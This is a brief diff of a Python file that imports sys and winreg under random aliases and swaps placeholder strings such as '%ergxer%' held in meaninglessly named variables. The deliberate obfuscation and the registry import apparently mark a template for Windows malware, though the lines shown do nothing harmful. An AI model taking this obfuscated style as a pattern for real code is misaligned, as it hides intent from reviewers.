@@ -16,13 +16,12 @@ import sys as wzf8u4w7
 import winreg as ef9uh77
 
 
-xwwwrew = "%ergxer%"
-dsfrsdjk = "%erxgre%"
-dsvisdf = "%erxger%"
+xwwwrew = "%Brgxer%"
+dsfrsdjk = "%Zrxgre%"
+dsvisdf = "%Brxger%"
 
-yxuiue = "%hxud%"
-deiuc = "%cdhji%"
-
+yxuiue = "%Bxud%"
+deiuc = "%Hdhji%"
 
 def esuih():
     try:
